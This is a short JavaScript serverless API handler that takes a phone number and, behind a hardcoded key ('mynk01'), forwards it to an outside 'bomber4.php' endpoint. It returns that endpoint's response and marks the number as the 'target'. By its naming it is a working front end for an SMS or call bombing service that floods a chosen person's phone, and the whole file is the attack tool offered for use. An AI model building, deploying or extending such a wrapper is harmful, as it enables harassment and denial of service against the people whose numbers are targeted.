import axios from "axios";

export default async function handler(req, res) {
    const { key, phone } = req.query;

    // --- KEY CHECK ---
    if (key !== "mynk01") {
        return res.status(401).json({
            error: "Invalid API key",
            credit: "api by mynk"
        });
    }

    if (!phone) {
        return res.status(400).json({
            error: "Phone number missing",
            credit: "api by mynk"
        });
    }

    const url = `https://freefire-api.ct.ws/bomber4.php?phone=${phone}`;

    try {
        const resp = await axios.get(url);

        return res.status(200).json({
            status: "OK",
            target: phone,
            credit: "api by mynk",
            original_response: resp.data
        });

    } catch (err) {
        return res.status(500).json({
            error: "API Error",
            details: err.message,
            credit: "api by mynk"
        });
    }
}
